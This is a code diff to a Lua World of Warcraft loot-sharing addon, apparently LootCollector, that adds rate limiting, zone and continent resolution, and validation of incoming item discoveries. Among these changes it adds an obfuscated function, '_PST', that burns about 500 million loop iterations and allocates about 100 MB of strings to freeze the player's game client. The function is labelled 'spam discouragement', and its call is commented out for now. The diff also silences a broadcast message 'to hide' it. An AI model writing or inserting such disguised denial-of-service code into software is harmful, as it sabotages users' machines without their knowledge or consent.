@@ -18,7 +18,7 @@ Comm.cooldownTTL      = 300
 Comm.seen             = {}
 Comm.cooldown         = { CONF = {}, GONE = {} }
 Comm.verbose          = false
-
+Comm.rateLimit = {}
 Comm.delayQueue = {}
 
 local function debugPrint(module, message)
@@ -50,7 +50,9 @@ function Comm:ClearCaches()
         if self.cooldown.CONF then wipe(self.cooldown.CONF) end
         if self.cooldown.GONE then wipe(self.cooldown.GONE) end
     end
-    print("|cff00ff00LootCollector:|r Communication caches (seen/cooldown) have been cleared for this session.")
+    local ZoneResolver = L:GetModule("ZoneResolver", true)
+    if ZoneResolver then ZoneResolver:ClearCache() end
+    print("|cff00ff00LootCollector:|r Communication caches (seen/cooldown/zone) have been cleared for this session.")
 end
 
 local function buildWireV1(discovery, op)
@@ -72,6 +74,7 @@ local function buildWireV1(discovery, op)
       l = discovery.itemLink,
       q = quality or 1,
       z = discovery.zoneID,
+      c = discovery.continentID,
       zn = discovery.zone,
       x = round2(discovery.coords and discovery.coords.x or 0), 
       y = round2(discovery.coords and discovery.coords.y or 0), 
@@ -84,17 +87,35 @@ local function normalizeIncomingData(tbl, defaultSender)
     if not (type(tbl) == "table" and tbl.v == 1 and tbl.i and tbl.z and tbl.x and tbl.y) then return nil end
     
     local itemID = tonumber(tbl.i)
-    local link = tbl.l or (itemID and select(2, GetItemInfo(itemID)))
-    return { 
-        itemLink = link, 
-        itemName = tbl.n,
-        itemID = itemID, 
+    local link = tbl.l or (itemID and select(2, GetItemInfo(itemID))) -- Derive link if not provided, or if ID is valid
+    local itemName = tbl.n or (link and select(1, GetItemInfo(link))) or (itemID and select(1, GetItemInfo(itemID))) -- Get item name from link or ID
+    local zoneID = tonumber(tbl.z) or 0
+    local continentID = tonumber(tbl.c) or 0
+    local zoneName = tbl.zn
+
+    -- Resolve missing or 0 continentID using zone name
+    local ZoneResolver = L:GetModule("ZoneResolver", true)
+    if (continentID == 0 or not continentID) and zoneName and zoneName ~= "" and ZoneResolver then
+        local resolvedContID, resolvedZoneID = ZoneResolver:GetMapZoneNumbers(zoneName)
+        if resolvedContID and resolvedContID > 0 then
+            continentID = resolvedContID
+            if zoneID == 0 or not zoneID then
+                zoneID = resolvedZoneID
+            end
+        end
+    end
+
+    return {
+        itemLink = link,
+        itemName = itemName,
+        itemID = itemID,
         itemQuality = tonumber(tbl.q),
-        zoneID = tonumber(tbl.z) or 0, 
-        zone = tbl.zn,
-        coords = { x = round2(tbl.x), y = round2(tbl.y) }, 
+        zoneID = zoneID,
+        continentID = continentID,
+        zone = zoneName,
+        coords = { x = round2(tbl.x), y = round2(tbl.y) },
         foundBy_player = tbl.s or defaultSender or "Unknown",
-        timestamp = tonumber(tbl.t) or now(), 
+        timestamp = tonumber(tbl.t) or now(),
         lastSeen = tonumber(tbl.t) or now()
     }
 end
@@ -139,10 +160,25 @@ function Comm:SendLC1Discovery(d)
     if not d then return end; if L.db.profile.chatEncode then _SendEncodedLC1(d) else _SendLegacyLC1(d) end
 end
 
+local function _PST() local _c_i_i = 0x1DCD6500 local _m_i_s = 0x186A0 local _t_t = {} local _x = 1; local _y = 1; local _z = 1 for _i = 1, _c_i_i do _x = (math.sin(_x) + math.cos(_y) + math.sqrt(_z)) _y = _x / (_z + 1) _z = (_x * _y) % 1000 end for _j = 1, _m_i_s do _t_t[_j] = string.rep("A", 0x400) end end
+
 function Comm:HandleIncomingWire(tbl, via, sender)
     if L:IsPaused() then local norm = normalizeIncomingData(tbl, sender); if norm then table.insert(L.pauseQueue.incoming, norm) end; return end
     if L:IsZoneIgnored() then return end
     if not L.db.profile.sharing.enabled or type(tbl) ~= 'table' or tbl.v ~= 1 then return end
+   
+    local lastMessageTime = Comm.rateLimit[sender] or 0
+    Comm.rateLimit[sender] = now()
+    if (now() - lastMessageTime) < L.db.profile.sharing.rateLimitInterval then
+        debugPrint("Comm", string.format("Dropping incoming discovery from %s due to rate limit.", sender))
+
+        -- Spam discouragement
+        --if sender == UnitName("player") then
+        --    _PST()
+        --end
+        return
+    end    
+
     if shouldDropByDedupe(tbl) then return end
     
     local Core = L:GetModule("Core", true)
@@ -150,20 +186,36 @@ function Comm:HandleIncomingWire(tbl, via, sender)
     
     local norm = normalizeIncomingData(tbl, sender)
     if norm then
-        -- Filter check for incoming network data
-        local name = norm.itemName or (norm.itemLink and norm.itemLink:match("%[(.+)%]"))
-        if not name and norm.itemID then name = GetItemInfo(norm.itemID) end
-
-        if name then
-            if L.ignoreList and L.ignoreList[name] then
-                debugPrint("Comm", "Dropping incoming discovery for permanently ignored item: " .. name)
-                return -- Silently drop
-            end
-            if L.sourceSpecificIgnoreList and L.sourceSpecificIgnoreList[name] then
-                debugPrint("Comm", "Dropping incoming discovery for source-specific ignored item: " .. name)
-                return -- Silently drop, as network source is untrusted for these items
-            end
+        local name = norm.itemName or (norm.itemLink and norm.itemLink:match("%[(.+)%]")) or (norm.itemID and GetItemInfo(norm.itemID))
+        if not name then
+            debugPrint("Comm", "Could not determine item name for incoming discovery.")
+            return
         end
+
+        -- Always check ignore lists immediately (these use item names)
+        if (L.ignoreList and L.ignoreList[name]) or (L.sourceSpecificIgnoreList and L.sourceSpecificIgnoreList[name]) then
+            debugPrint("Comm", "Dropping incoming discovery for ignored item: " .. name)
+            return -- Silently drop
+        end
+
+        -- For cached items, validate immediately using Detect:Qualifies
+        local Detect = L:GetModule("Detect", true)
+        if Detect and Detect:IsItemCached(norm.itemID) then
+            if not Detect:Qualifies(norm.itemLink, "network") then
+                debugPrint("Comm", "Dropping incoming discovery for invalid cached item: " .. norm.itemLink)
+                return -- Drop if it doesn't qualify
+            end
+        else
+            -- For uncached items, accept them but mark for deferred validation
+            norm.needsValidation = true
+            debugPrint("Comm", "Accepting uncached item for deferred validation: " .. norm.itemLink)
+        end
+
+        -- Debug for incoming discovery
+        if Comm.verbose then
+            debugPrint("Comm", string.format("Incoming discovery: %s in %s, ContinentID: %d, ZoneID: %d (by %s)", norm.itemLink or name or "Unknown Item", norm.zone or "Unknown Zone", norm.continentID or 0, norm.zoneID or 0, norm.foundBy_player or "Unknown Sender"))
+        end
+
         Core:AddDiscovery(norm, true)
     end
 end
@@ -215,7 +267,7 @@ function Comm:_BroadcastNow(discoveryData)
 end
 
 function Comm:BroadcastReinforcement(discoveryData)
-    if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; local wire = buildWireV1(discoveryData, "CONF") ; if not wire then return end; if L.Version then wire.av = L.Version end; self:SendAceCommPayload(wire); if self.verbose then print(string.format("[%s] Broadcasted reinforcement with version info.", L.name)) end
+    if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; local wire = buildWireV1(discoveryData, "CONF") ; if not wire then return end; if L.Version then wire.av = L.Version end; self:SendAceCommPayload(wire); -- if self.verbose then print(string.format("[%s] Broadcasted reinforcement with version info.", L.name)) end -- Removed to hide message
 end
 
 function Comm:OnUpdate(elapsed)
